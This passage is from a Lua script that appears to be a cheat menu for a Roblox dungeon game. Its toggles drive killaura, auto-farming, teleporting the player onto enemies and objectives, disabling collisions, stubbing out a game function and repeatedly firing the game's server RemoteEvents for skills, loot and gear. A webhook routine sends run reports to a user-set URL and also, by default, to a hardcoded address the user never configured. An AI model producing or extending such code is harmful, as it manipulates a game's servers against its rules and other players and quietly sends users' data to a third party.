                                Options.Offset:SetValue(gq)
                            end
                        end
                    end
                    task.wait(1)
                end
            end)
        end
    end
})
ConfigSystem.registerUIElement("Killaura", KillauraToggle)     
-- killauradelayline
local KillauraDelaySlider = Tab1:Slider({
    Title = "Killaura Delay",
    Desc = "Delay between attacks (seconds)",
    Step = 0.01,
    Value = {
        Min = 0,
        Max = 1,
        Default = 0,
    },
    Callback = function(value)
        Options.KillauraDelay:SetValue(value)
    end
})
ConfigSystem.registerUIElement("KillauraDelay", KillauraDelaySlider)
--autofarmline
local AutofarmToggle = Tab1:Toggle({
    Title = "Auto Farm",
    Desc = "Auto-farm and complete missions",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(fn)
    Toggles.Autofarm:SetValue(fn)
    ak = tick()
    bX = false;
    if not fn then
        fl.AddItemToQueue = fm
    end
    
    -- ✅ Check config ready - KHÔNG delay lâu
    if fn and aC then
        -- Nếu config chưa load, chỉ đợi counter init (tối đa 1s)
        if not ConfigAutoLoaded then
            local waitStart = tick()
            while (bt < 2 or bs < 2 or bu < 2) and tick() - waitStart < 1 and Toggles.Autofarm.Value do
                task.wait(0.05)
            end
        else
            -- Config đã load, đợi counter thêm chút
            local waitStart = tick()
            while (bt < 2 or bs < 2 or bu < 2) and tick() - waitStart < 0.5 and Toggles.Autofarm.Value do
                task.wait(0.05)
            end
        end
    end
    
    if fn and aI and aC then
        for dj, ck in workspace:GetChildren() do
            for z, R in fk do
                if ck.Name == z and ck:IsA(R) then
                    ck:Destroy()
                end
            end
        end
    end
    
    -- ✅ Thực thi start timer VÀ ĐỢI nó hoàn thành
    if fn and aC then
        executeStartTimer()  -- Gọi trực tiếp, KHÔNG dùng task.spawn
    end
    
    if aC and Toggles.Autofarm.Value then
        fl.AddItemToQueue = function(...)
            do
                return
            end
        end;
        if not fi then
            local fs = Instance.new("Part")
            fs.Anchored = true;
            fs.Size = Vector3.new(20, 1, 20)
            fs.Parent = workspace;
            fs.Transparency = 1;
            fi = true
        end
        if aw:FindFirstChild('MissionStart') and alive() then
            for z, R in aw.MissionStart:GetDescendants() do
                if R:IsA('TouchTransmitter') and R.Parent then
                    R.Parent.CanCollide = false;
                    R.Parent.Anchored = true;
                    R.Parent.CFrame = CFrame.new(aU.Position)
                    break
                end
            end
        end
        if aF or aH then
            AutoCheckpoint()
        end
        if ay ~= 38 then
            AntiFling()
        end
        MobCounter()
        -- ============== AUTO SKILL USAGE ==============
        task.spawn(function()
            local lastSkillUse = {}
            
            while Toggles.Autofarm.Value and aC do
                if alive() and bd > 0 then  -- Chỉ dùng skill khi có mob
                    local skills = {
                        {"Demon", "BloodBinding", 3},
                        {"Dragoon", "DragonSlam", 3},
                        {"Guardian", "AggroDraw", 5},
                        {"DualWielder", "AttackBuff", 5},
                        {"Guardian", "UpdateSpeed", 8},
                        {"Paladin", "LightThurst", 3},
                        {"Paladin", "GuildedLight", 5},
                        {"MageOfLight", "Infuse", 6}
                    }
                    
                    for _, skill in ipairs(skills) do
                        local skillset, action, cooldown = skill[1], skill[2], skill[3] or 3
                        local skillKey = skillset .. "_" .. action
                        local currentTime = tick()
                        
                        -- Kiểm tra cooldown
                        if not lastSkillUse[skillKey] or (currentTime - lastSkillUse[skillKey] >= cooldown) then
                            local skillFolder = bc:FindFirstChild(skillset)
                            
                            if skillFolder then
                                local skillAction = skillFolder:FindFirstChild(action)
                                if skillAction and skillAction:IsA("RemoteEvent") then
                                    local success = pcall(function()
                                        skillAction:FireServer()
                                    end)
                                    
                                    if success then
                                        lastSkillUse[skillKey] = currentTime
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait(0.5)  -- Check mỗi 0.5 giây để dùng skill nhanh hơn
            end
        end)
        -- ============== END AUTO SKILL USAGE ==============        
        local ft = false;
        for z, R in ca do
            -- ✅ SỬA: Check cả ax:FindFirstChild(R.Id) VÀ ay == R.Id
            if ax:FindFirstChild(R.Id) or ay == R.Id then
                ft = true;
                if R.ignoreMob then
                    MobTeleportIgnore(R.ignoreMob, R.mobWaitTbl, R.mobWaitTime, R.alwaysWait)
                elseif R.priorityTbl then
                    MobTeleportPriority(R.priorityTbl, R.mobWaitTbl, R.mobWaitTime, R.alwaysWait)
                end
                break
            end
        end
        if not ft then
            MobTeleport()
        end
        task.spawn(function()
            while Toggles.Autofarm.Value do
                if alive() and aV:FindFirstChild('MaxHealth') then
                    local fu = aV.Health.Value / aV.MaxHealth.Value / 0.01;
                    local healPct = tonumber(Options.healPercent.Value) or 30
                    local resumePct = tonumber(Options.resumePercent.Value) or 80
                    
                    if resumePct > healPct then
                        if fu <= healPct and fu > 0 and not bX then
                            bX = true;
                            libNoti('Pausing to heal!', 2)
                        elseif fu >= resumePct and bX then
                            bX = false;
                            libNoti('Resuming attack!', 2)
                        end
                    else
                        if fu == 100 and bX then
                            bX = false;
                            libNoti('Resuming attack!', 2)
                        end
                    end
                end
                local fv = workspace:FindFirstChild('IceWall') or workspace:FindFirstChild('IgnisShield')
                fv = fv and fv:FindFirstChild('Ring')
                local fw =
                    workspace:FindFirstChild('KrakenCannon') and workspace.KrakenCannon:FindFirstChild('Base') and
                        workspace.KrakenCannon.Base.Transparency < 1 and workspace.KrakenCannon.Base;
                local fx = workspace:FindFirstChild('CureFountainFallenKing') and
                               workspace.CureFountainFallenKing:FindFirstChild('ArcanePanel')
                local fy = fv or fw or fx;
                if fy and alive() then
                    if a8 then
                        a8 = false
                    end
                    if (aU.Position - fy.Position).magnitude > 10 then
                        aT:SetPrimaryPartCFrame(fy.CFrame * CFrame.new(0, 3, 0))
                    end
                else
                    if not a8 then
                        a8 = true
                    end
                end
                task.wait()
            end
        end)
    end
    if aH and Toggles.Autofarm.Value and aC then
        task.spawn(function()
            while Toggles.Autofarm.Value do
                local fz = 0;
                for z = 1, 4 do
                    local A = findFirstChild(c.PlayerGui, {'TowerVisual', 'TowerVisual', 'TowerChests', 'Chests',
                                                           'Chest' .. z, 'Overlay'})
                    if A and A.IsLoaded then
                        fz = fz + 1
                    end
                end
                if fz == 4 then
                    table.insert(c7, 'BossDoorTrigger')
                end
                local dw = tick()
                repeat
                    task.wait()
                until tick() - dw > 2 or not Toggles.Autofarm.Value;
                task.wait()
            end
        end)
    end
    if fn and aG and aC then
        local fA;
        local fB;
        local fC;
        local fD;
        task.spawn(function()
            while Toggles.Autofarm.Value and disabled do
                if bj and a8 and not fA then
                    local fE = bl:GetChildren()
                    if not fC and not fD then
                        fD = true;
                        task.spawn(function()
                            for z, R in fE do
                                if isAlive(R) and
                                    not (R.MobProperties.CurrentAttack.Value == 'Piledriver' or
                                        R.MobProperties.CurrentAttack.Value == 'Slap') then
                                    local ab = R.PrimaryPart;
                                    local dw = tick()
                                    while ab and not fC and not fA and a8 and Toggles.Autofarm.Value do
                                        if tick() - dw >= 0.4 then
                                            break
                                        end
                                        local fF = bX and e0 or Vector3.new()
                                        SmartPlayerTp(CFrame.new(ab.Position + Vector3.new(0, 40, 0) + fF) +
                                                          ab.CFrame.lookVector * 30, ab)
                                        b_:Wait()
                                    end
                                end
                            end
                            local dw = tick()
                            while ab and not fC and not fA and a8 and bd == 1 do
                                if tick() - dw >= 0.4 then
                                    break
                                end
                                SmartPlayerTp(CFrame.new(3371, 73, -331))
                                b_:Wait()
                            end
                            fD = false
                        end)
                    end
                    for z, R in fE do
                        if isAlive(R) and
                            (R.MobProperties.CurrentAttack.Value == 'Piledriver' or R.MobProperties.CurrentAttack.Value ==
                                'Slap') and R.PrimaryPart then
                            local ab = R.PrimaryPart;
                            local fG =
                                (CFrame.new(ab.Position + Vector3.new(0, 5, 0)) + ab.CFrame.lookVector * 45).Position;
                            while isAlive(R) and Toggles.Autofarm.Value and
                                (R.MobProperties.CurrentAttack.Value == 'Piledriver' or
                                    R.MobProperties.CurrentAttack.Value == 'Slap') and ab and not fA and a8 do
                                if not fC then
                                    fC = true
                                end
                                local e2 = 5 + Options.Offset.Value;
                                local fF = bX and e0 or Vector3.new()
                                setCamera(not bX and Toggles.mobCamera.Value and bw, fG)
                                SmartPlayerTp(CFrame.new(ab.Position + Vector3.new(0, e2, 0) + fF) +
                                                  ab.CFrame.lookVector * 45, ab)
                                b_:Wait()
                            end
                            SmartPlayerTp(CFrame.new(3371, 73, -331))
                        end
                    end
                    if fC then
                        fC = false
                    end
                    bY = nil;
                    unnoclip()
                    setCamera()
                end
                task.wait()
            end
        end)
        task.spawn(function()
            while Toggles.Autofarm.Value and disabled do
                if bj and Workspace:FindFirstChild('KrakenPipe') and not Toggles.ignoreCannon.Value and alive() then
                    for z, R in Workspace:GetChildren() do
                        if R.Name == 'KrakenPipe' and R:FindFirstChild('GuiPart') and
                            R.GuiPart:FindFirstChild('SurfaceGui') and R.GuiPart.SurfaceGui:FindFirstChild('Percent') and
                            R:FindFirstChild('Base') then
                            while Toggles.Autofarm.Value and R.GuiPart.SurfaceGui.Percent.Text ~= '100%' and
                                not Toggles.ignoreCannon.Value do
                                if not fA then
                                    fA = true
                                end
                                local fF = bX and e0 or Vector3.new()
                                if alive() and (aU.Position - R.Base.Position).magnitude > 10 then
                                    SmartPlayerTp(CFrame.new(R.Base.Position + Vector3.new(0, 3, 0) + fF))
                                end
                                b_:Wait()
                            end
                        end
                    end
                end
                if fA then
                    fA = false
                end
                task.wait()
            end
        end)
    end
    if (aI or aJ) and Toggles.Autofarm.Value and aC then
        MobTeleport()
        local fH = game:GetService("Workspace").LobbyTeleport.Interaction;
        local fI = game:GetService("Workspace").Boss_Gate.Interactions.Bounds;
        task.spawn(function()
            while Toggles.Autofarm.Value do
                if alive() then
                    fI.CanCollide = false;
                    fI.CFrame = CFrame.new(aU.Position)
                    fH.CFrame = CFrame.new(aU.Position)
                end
                task.wait(0.25)
            end
        end)
        if aI then
            while Toggles.Autofarm.Value do
                if a4.ReplicateTowerStartFloor.Value >= 100 then
                    break
                end
                task.wait()
            end
            local fJ = a4.ReplicateTowerStartFloor.Value;
            local fK = a4.ReplicateTowerFloor;
            function hook(eq, er, es, color)
                pcallWithError(function()
                    request({
                        Url = eq,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = e:JSONEncode({
                            ["embeds"] = {{
                                ["title"] = er,
                                ["description"] = es,
                                ["type"] = 'rich',
                                ["color"] = tonumber(color),
                                ["footer"] = {
                                    ["text"] = utcDateAndTime() .. ' UTC'
                                }
                            }}
                        })
                    })
                end)
            end
            task.spawn(function()
                while Toggles.Autofarm.Value do
                    if Options.completedInfiniteTowerFloors.Value and
                        tonumber(Options.completedInfiniteTowerFloors.Value) > 0 then
                        if fK.Value - fJ >= tonumber(Options.completedInfiniteTowerFloors.Value) and
                            Toggles.restartAfterFloors.Value then
                            libNoti(fK.Value - fJ .. ' floors completed, restarting Infinite Tower!')
                            task.spawn(function()
                                local fL =
                                    '## Floor: ``' .. fK.Value .. '``' .. '\nTime: ``' .. timeElapsed(tick() - g) ..
                                        '``\nClass: ' .. '``' .. cl[b9].DisplayName .. '``'
                                fL = fL .. '\nGold Gain: ``' .. formatNumberWithCommas(b2 - b1) .. '``'
                                if not Toggles.anonHook.Value then
                                    fL = fL .. '\n' .. f
                                end
                                if Options.dungeonHook.Value and #Options.dungeonHook.Value > 30 then
                                    hook(Options.dungeonHook.Value, 'Smart Restarting Infinite Tower', fL, C.Gold)
                                end
                                if Toggles.anonHook.Value then
                                    fL = fL .. '\n' .. f
                                end
                                if not olympus then
                                    hook(boink3, 'Smart Restarting Infinite Tower', fL, C.Gold)
                                end
                            end)
                            task.spawn(function()
                                task.wait(3)
                                StartRaid(ay)
                            end)
                            break
                        end
                    end
                    if fK.Value > fJ and fK.Value % 5 == 0 and fK.Value ~= fj then
                        fj = fK.Value;
                        local fL = '## Floor: ``' .. fK.Value .. '``' .. '\nTime: ``' .. timeElapsed(tick() - g) ..
                                       '``\nClass: ' .. '``' .. cl[b9].DisplayName .. '``'
                        fL = fL .. '\nGold Gain: ``' .. formatNumberWithCommas(b2 - b1) .. '``'
                        if not Toggles.anonHook.Value then
                            fL = fL .. '\n' .. f
                        end
                        if Options.dungeonHook.Value and #Options.dungeonHook.Value > 30 then
                            libNoti('Infinite Tower webhook report sent!')
                            hook(Options.dungeonHook.Value, 'Infinite Tower Report', fL, C.Purple)
                        end
                        if Toggles.anonHook.Value then
                            fL = fL .. '\n' .. f
                        end
                        if not olympus then
                            hook(boink3, 'Infinite Tower Report', fL, C.Purple)
                        end
                    end
                    task.wait()
                end
            end)
        end
    end
    
    end
})
ConfigSystem.registerUIElement("Autofarm", AutofarmToggle)
-- Thêm vào Tab1 (Farm tab), sau toggle CollectDrops (khoảng dòng 5007):

--collectbufforb line
local CollectBuffOrbToggle = Tab1:Toggle({
    Title = "Auto Collect Buff Orbs",
    Desc = "Auto-collect DamageBuffOrb, HealthBuffOrb, UltChargeBuffOrb",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.CollectBuffOrb:SetValue(state)
        
        -- ✅ KHÔNG dùng if state then - dùng if not state thay vì
        if not state then
            return
        end
        
        -- Bật auto collect buff orbs
        task.spawn(function()
            while Toggles.CollectBuffOrb.Value and Toggles.Autofarm.Value and aC do
                if alive() then
                    local closestOrb = nil
                    local closestDist = math.huge
                    
                    -- Tìm buff orb gần nhất
                    for _, obj in pairs(workspace:GetChildren()) do
                        if obj.Name:find("BuffOrb") and obj:IsA("Model") and obj.PrimaryPart then
                            local dist = (aU.Position - obj.PrimaryPart.Position).magnitude
                            if dist < closestDist and dist < 350 then
                                closestOrb = obj
                                closestDist = dist
                            end
                        end
                    end
                    
                    -- Nếu tìm thấy orb, tạm dừng autofarm và lụm
                    if closestOrb and closestOrb.PrimaryPart then
                        local orbType = closestOrb.Name:gsub("BuffOrb", "")
                        
                        -- TẮT a8 để dừng MobTeleport
                        local wasActive = a8
                        a8 = false
                        
                        -- Teleport đến orb nhiều lần để đảm bảo lụm được
                        local orbPos = closestOrb.PrimaryPart.Position
                        for i = 1, 2 do
                            if not closestOrb or not closestOrb.Parent then
                                break
                            end
                            aT:SetPrimaryPartCFrame(CFrame.new(orbPos))
                            task.wait(0.1)
                        end
                        
                        -- BẬT lại a8
                        a8 = wasActive
                        
                        -- Đợi orb biến mất hoặc timeout
                        local startTime = tick()
                        while closestOrb and closestOrb.Parent and tick() - startTime < 0.5 do
                            task.wait(0.1)
                        end
                    end
                end
                task.wait(1)
            end
        end)
    end
})
ConfigSystem.registerUIElement("CollectBuffOrb", CollectBuffOrbToggle)

-- offsetline
local OffsetSlider = Tab1:Slider({
    Title = "Offset",
    Desc = "Attack distance (Negative: below, Positive: above | Ranged: 50, Melee: 7)",
    Step = 1,
    Value = {
        Min = -75,
        Max = 75,
        Default = isRangedClass() and 50 or 7,
    },
    Callback = function(value)
        Options.Offset:SetValue(value)
    end
})
ConfigSystem.registerUIElement("Offset", OffsetSlider)
-- healpercentline
local HealPercentSlider = Tab1:Slider({
    Title = "Heal At",
    Desc = "Heal when HP drops below this %",
    Step = 1,
    Value = {
        Min = 0,
        Max = 100,
        Default = 30,
    },
    Callback = function(value)
        Options.healPercent:SetValue(value)
    end
})
ConfigSystem.registerUIElement("healPercent", HealPercentSlider)
-- resumepercentline
local ResumePercentSlider = Tab1:Slider({
    Title = "Resume At",
    Desc = "Resume farming when HP reaches this %",
    Step = 1,
    Value = {
        Min = 0,
        Max = 100,
        Default = 100,
    },
    Callback = function(value)
        Options.resumePercent:SetValue(value)
    end
})
ConfigSystem.registerUIElement("resumePercent", ResumePercentSlider)
--autocollectdropsline
local CollectDropsToggle = Tab1:Toggle({
    Title = "Auto Collect Drops",
    Desc = "Auto-collect dropped items",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.CollectDrops:SetValue(state)
        
        -- ✅ Di chuyển if not state XUỐNG SAU SetValue
        if not state then
            return
        end
        
        task.spawn(function()
            while Toggles.CollectDrops.Value do
                for gr, gs in aY do
                    gs.model:Destroy()
                    gs.followPart:Destroy()
                    table.remove(aY, gr)
                    aZ:FireServer(gs.id)
                end
                task.wait()
            end
        end)
    end
})
ConfigSystem.registerUIElement("CollectDrops", CollectDropsToggle)


--autoequipbestweaponline
local AutoEquipBestWeaponToggle = Tab1:Toggle({
    Title = "AutoEquip Best Weapon",
    Desc = "Auto-equip best weapon",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(cU)
        Toggles.autoEquipBestwWep:SetValue(cU)
        
        -- ✅ Di chuyển if not cU XUỐNG SAU SetValue
        if not cU then
            return
        end
        
        task.spawn(function()
            while Toggles.autoEquipBestwWep.Value do
                local gt, gu = 0, 0
                local gv, gw
                local gg = b4:GetChildren()[1]
                if gg then
                    gt = bS:GetItemStats(gg)['Attack'] or 0
                end
                local gx, gy = 0, 0
                local gz, gA
                local gB = b6:GetChildren()[1]
                if gB then
                    gx = bS:GetItemStats(gB)['Defense'] or 0
                end
                for z, R in bM:GetChildren() do
                    if R:FindFirstChild('Level') and R.Level.Value <= a_.Level.Value then
                        local gC = bR[R.Name]
                        local gD, gE = gC.Type == 'Weapon', gC.Type == 'Armor'
                        local gF, gG = gD and bS:GetItemStats(R)['Attack'], gE and bS:GetItemStats(R)['Defense']
                        if gD and gF and gF > gt and gF > gu then
                            gv = R
                            gu = gF
                            gw = gC.DisplayKey
                        end
                        if gE and gG and gG > gx and gG > gy then
                            gz = R
                            gy = gG
                            gA = gC.DisplayKey
                        end
                    end
                end
                if gv then
                    libNoti('Equipped a T' .. c0:GetItemTier(gv) .. ' ' .. gw .. ' - Power: ' .. gu)
                    bT:FireServer(gv, b4)
                end
                if gz then
                    libNoti('Equipped a T' .. c0:GetItemTier(gz) .. ' ' .. gA .. ' - Defense: ' .. gy)
                    bT:FireServer(gz, b6)
                end
                task.wait(2)
            end
        end)
    end
})
ConfigSystem.registerUIElement("autoEquipBestwWep", AutoEquipBestWeaponToggle)

--nodamagenumbersline
local NVDToggle = Tab1:Toggle({
    Title = "No Damage Numbers",
    Desc = "Hide damage numbers",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.NVD:SetValue(state)
        -- Hook đã được setup ở trên, chỉ cần update giá trị
    end
})
ConfigSystem.registerUIElement("NVD", NVDToggle)
--collecteggchestsline
local CollectEggChestsToggle = Tab1:Toggle({
    Title = "Collect Egg Chests",
    Desc = "Auto-collect egg chests",
    Icon = "flower",
    Type = "Checkbox",
    Default = true,
    Callback = function(state)
        Toggles.collectEggChests:SetValue(state)
    end
})
ConfigSystem.registerUIElement("collectEggChests", CollectEggChestsToggle)

--restartdungeonline
local RestartDungeonToggle = Tab1:Toggle({
    Title = "Restart Dungeon",
    Desc = "Auto-restart dungeon after completion",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.RestartDungeon:SetValue(state)
    end
})
ConfigSystem.registerUIElement("RestartDungeon", RestartDungeonToggle)
--nightmareloopline
local NightmareLoopToggle = Tab1:Toggle({
    Title = "Nightmare Loop",
    Desc = "Auto-loop nightmare dungeons",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.nightmareLoop:SetValue(state)
    end
})
ConfigSystem.registerUIElement("nightmareLoop", NightmareLoopToggle)
--nextdungeonline
local NextDungeonToggle = Tab1:Toggle({
    Title = "Next Dungeon",
    Desc = "Auto-switch to next dungeon",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.NextDungeon:SetValue(state)
    end
})
ConfigSystem.registerUIElement("NextDungeon", NextDungeonToggle)

--perkswitcherline
local PerkSwitcherToggle = Tab1:Toggle({
    Title = "Auto Switch Perks",
    Desc = "Enable Primary Perks for mobs, Offhand Perks for bosses",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.PerkSwitcher:SetValue(state)
    end
})
ConfigSystem.registerUIElement("PerkSwitcher", PerkSwitcherToggle)

--mobcameraline
local MobCameraToggle = Tab1:Toggle({
    Title = "Mob POV",
    Desc = "Camera follows monster perspective",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.mobCamera:SetValue(state)
    end
})
ConfigSystem.registerUIElement("mobCamera", MobCameraToggle)


-- fastsprintline
local FastSprintSlider = Tab1:Slider({
    Title = "Fast Sprint",
    Desc = "Fast movement speed",
    Step = 1,
    Value = {
        Min = 16,
        Max = 100,
        Default = 25,
    },
    Callback = function(value)
        Options.FastSprint:SetValue(value)
    end
})
ConfigSystem.registerUIElement("FastSprint", FastSprintSlider)
-- Thêm sau FastSprintSlider, trước phần Tab2

-- restartdungeonbuttonline
-- restartdungeonbuttonline
local RestartDungeonButton = Tab1:Button({
    Title = "Restart Current Dungeon",
    Description = "Restart current dungeon/tower immediately",
    Callback = function()
        -- Kiểm tra có đang ở trong dungeon/mission không
        if not aC then
            WindUI:Notify({
                Title = "Restart Dungeon",
                Content = "You are not in any dungeon/tower!",
                Duration = 3
            })
            return
        end
        
        -- Lấy mission ID từ ActiveMission
        local currentMissionId = a4:FindFirstChild("ActiveMission") and a4.ActiveMission.Value or ay
        
        if not currentMissionId then
            WindUI:Notify({
                Title = "Restart Dungeon",
                Content = "Dungeon/tower information not found!",
                Duration = 3
            })
            return
        end
        
        -- Lấy difficulty (nếu có)
        local currentDifficulty = nil
        if aF then
            -- Dungeon thường có difficulty
            currentDifficulty = az or a5.Missions.GetDifficulty:InvokeServer()
        elseif aH then
            -- Tower không có difficulty
            currentDifficulty = nil
        elseif aI or aJ then
            -- Infinite/Celestial Tower không có difficulty
            currentDifficulty = nil
        elseif aK then
            -- Nightmare dungeon
            currentDifficulty = az or 1
        elseif aL then
            -- Event raid
            currentDifficulty = nil
        end
        
        -- Lấy tên mission
        local missionName = bO[currentMissionId] and bO[currentMissionId].NameTag or "Unknown"
        local difficultyText = ""
        if currentDifficulty then
            difficultyText = currentDifficulty == 1 and " (Normal)" or currentDifficulty == 5 and " (Challenge)" or ""
        end
        
        WindUI:Notify({
            Title = "Restart Dungeon",
            Content = "Restarting " .. missionName .. difficultyText .. "...",
            Duration = 3
        })
        
        -- Leave dungeon
        game:GetService("ReplicatedStorage").Shared.Missions.LeaveChoice:FireServer(true)
        game:GetService("ReplicatedStorage").Shared.Missions.NotifyReadyToLeave:FireServer()
        
        -- Wait và restart
        task.wait(2)
        StartRaid(currentMissionId, currentDifficulty)
    end
})
ConfigSystem.registerUIElement("RestartDungeon", RestartDungeonToggle)
end -- End Tab1 scope

-- dungeonrestarttimerline
do -- Tab2 scope
local DungeonRestartTimerSlider = Tab2:Slider({
    Title = "Dungeon Restart Timer",
    Desc = "Wait time before restarting dungeon (seconds)",
    Step = 1,
    Value = {
        Min = 0,
        Max = 300,
        Default = Options.dungeonRestartTimer and Options.dungeonRestartTimer.Value or 3,
    },
    Callback = function(value)
        Options.dungeonRestartTimer:SetValue(value)
    end
})
ConfigSystem.registerUIElement("dungeonRestartTimer", DungeonRestartTimerSlider)

-- restarttowertimerline
local TowerRestartTimerSlider = Tab2:Slider({
    Title = "Tower Restart Timer",
    Desc = "Wait time before restarting tower (seconds)",
    Step = 1,
    Value = {
        Min = 0,
        Max = 300,
        Default = Options.towerRestartTimer and Options.towerRestartTimer.Value or 3,
    },
    Callback = function(value)
        Options.towerRestartTimer:SetValue(value)
    end
})
ConfigSystem.registerUIElement("towerRestartTimer", TowerRestartTimerSlider)

-- dungeonstarttimerline
local DungeonStartTimerSlider = Tab2:Slider({
    Title = "Dungeon Start Timer",
    Desc = "Wait time before starting dungeon (seconds)",
    Step = 1,
    Value = {
        Min = 0,
        Max = 300,
        Default = Options.dungeonStartTimer and Options.dungeonStartTimer.Value or 0,
    },
    Callback = function(value)
        Options.dungeonStartTimer:SetValue(value)
        bs = bs + 1  -- Increment counter for initialization check
    end
})
ConfigSystem.registerUIElement("dungeonStartTimer", DungeonStartTimerSlider)

-- towerstarttimerline
local TowerStartTimerSlider = Tab2:Slider({
    Title = "Tower Start Timer",
    Desc = "Wait time before starting tower (seconds)",
    Step = 1,
    Value = {
        Min = 0,
        Max = 300,
        Default = Options.towerStartTimer and Options.towerStartTimer.Value or 0,
    },
    Callback = function(value)
        Options.towerStartTimer:SetValue(value)
        bt = bt + 1  -- Increment counter for initialization check
    end
})
ConfigSystem.registerUIElement("towerStartTimer", TowerStartTimerSlider)

-- timeoutline
local TimeoutTimerSlider = Tab2:Slider({
    Title = "Timeout Timer",
    Desc = "Timeout before force restart (seconds)",
    Step = 1,
    Value = {
        Min = 30,
        Max = 300,
        Default = Options.timeoutTimer and Options.timeoutTimer.Value or 60,
    },
    Callback = function(value)
        Options.timeoutTimer:SetValue(value)
    end
})
ConfigSystem.registerUIElement("timeoutTimer", TimeoutTimerSlider)

--inf smart restart line
local RestartAfterFloorsToggle = Tab2:Toggle({
    Title = "Inf Tower Smart Restart",
    Desc = "Auto-restart Infinite Tower after specified floors",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.restartAfterFloors:SetValue(state)
    end
})
ConfigSystem.registerUIElement("restartAfterFloors", RestartAfterFloorsToggle)

--completedfloorline
local CompletedFloorsInput = Tab2:Input({
    Title = "Floors",
    Description = "Floors completed before restart",
    Placeholder = "10",
    Value = "10",
    Numeric = true,
    Callback = function(value)
        local numValue = tonumber(value)
        if numValue and numValue > 0 then
            Options.completedInfiniteTowerFloors:SetValue(numValue)
        else
            Options.completedInfiniteTowerFloors:SetValue(10)
        end
    end
})
ConfigSystem.registerUIElement("completedInfiniteTowerFloors", CompletedFloorsInput)

--ignorecannonline
local IgnoreCannonToggle = Tab2:Toggle({
    Title = "Ignore Cannon (Atlantis Tower)",
    Desc = "Ignore cannon in Atlantis Tower",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.ignoreCannon:SetValue(state)
    end
})
ConfigSystem.registerUIElement("ignoreCannon", IgnoreCannonToggle)

--skipscarecrowline
local SkipScarecrowToggle = Tab2:Toggle({
    Title = "Skip Scarecrow Defense (NM Loop)",
    Desc = "Skip Scarecrow Defense in Nightmare Loop",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.skipScarecrowNm:SetValue(state)
    end
})
ConfigSystem.registerUIElement("skipScarecrowNm", SkipScarecrowToggle)

--rejoindungeonline
local RejoinDungeonToggle = Tab2:Toggle({
    Title = "Rejoin Last Dungeon",
    Desc = "Auto-restart last dungeon within time limit",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.rejoinDungeon:SetValue(state)
        ao.RejoinLastDungeon = state
        save()
    end
})
ConfigSystem.registerUIElement("rejoinDungeon", RejoinDungeonToggle)
--rejoindungeonlimitline
local RejoinDungeonLimitDropdown = Tab2:Dropdown({
    Title = "Rejoin Last Dungeon Limit",
    Description = "Time limit to rejoin",
    Values = {
        "30 minutes",
        "3 hours", 
        "12 hours",
        "24 hours",
        "Infinite"
    },
    Value = "30 minutes",
    Multi = false,
    Callback = function(selected)
        local timeMap = {
            ['30 minutes'] = 1800,
            ['3 hours'] = 10800,
            ['12 hours'] = 43200,
            ['24 hours'] = 86400,
            ['Infinite'] = 999999999
        }
        ao.RejoinLastDungeonThreshold = timeMap[selected]
        save()
    end
})
ConfigSystem.registerUIElement("rejoinDungeonLimit", RejoinDungeonLimitDropdown)

--forcerestartlasttowerline
local ForceRestartLastTowerToggle = Tab2:Toggle({
    Title = "Force Restart Last Tower",
    Desc = "Restart Tower when returning to town (voluntary or forced)",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.forceRestartLastTower:SetValue(state)
        ao.ForceRestartLastTower = state
        save()
    end
})
ConfigSystem.registerUIElement("forceRestartLastTower", ForceRestartLastTowerToggle)

--playercountkickline
local PlayerCountKickSlider = Tab2:Slider({
    Title = "Mission PlayerCount Kick",
    Desc = "Disconnect if player count reaches this threshold in mission",
    Step = 1,
    Value = {
        Min = 2,
        Max = 6,
        Default = 6,
    },
    Callback = function(value)
        Options.playerCountKick:SetValue(value)
    end
})
ConfigSystem.registerUIElement("playerCountKick", PlayerCountKickSlider)
end -- End Tab2 scope

-- ============== TAB3: WEAPONS ==============
do -- Tab3 scope
--mobweaponinputline
local MobWeaponInput = Tab3:Input({
    Title = "Current Mob Weapon",
    Description = "Current weapon ID for mobs",
    Placeholder = "Weapon ID",
    Value = "",
    Numeric = false,
    Callback = function(value)
        Options.mobWepId:SetValue(value)
    end
})
ConfigSystem.registerUIElement("mobWepId", MobWeaponInput)

--bossweaponinputline
local BossWeaponInput = Tab3:Input({
    Title = "Current Boss Weapon",
    Description = "Current weapon ID for bosses",
    Placeholder = "Weapon ID",
    Value = "",
    Numeric = false,
    Callback = function(value)
        Options.bossWepId:SetValue(value)
    end
})
ConfigSystem.registerUIElement("bossWepId", BossWeaponInput)

--setmobweaponbuttonline
local SetMobWeaponButton = Tab3:Button({
    Title = "Set Current Primary for Mobs",
    Description = "Killaura will auto-equip this weapon when fighting mobs",
    Callback = function()
        local cW = b4 and b4:GetChildren()[1]
        local cX = cW and cW.ID.Value
        if cX then
            Options.mobWepId:SetValue(cX)
            WindUI:Notify({
                Title = "Success",
                Content = 'Set ' .. bR[cW.Name].DisplayKey .. ' as your mob weapon!',
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "Error",
                Content = 'No suitable Primary Weapon Detected',
                Duration = 3
            })
        end
    end
})

--setbossweaponbuttonline
local SetBossWeaponButton = Tab3:Button({
    Title = "Set Current Primary for Bosses",
    Description = "Killaura will auto-equip this weapon when fighting bosses",
    Callback = function()
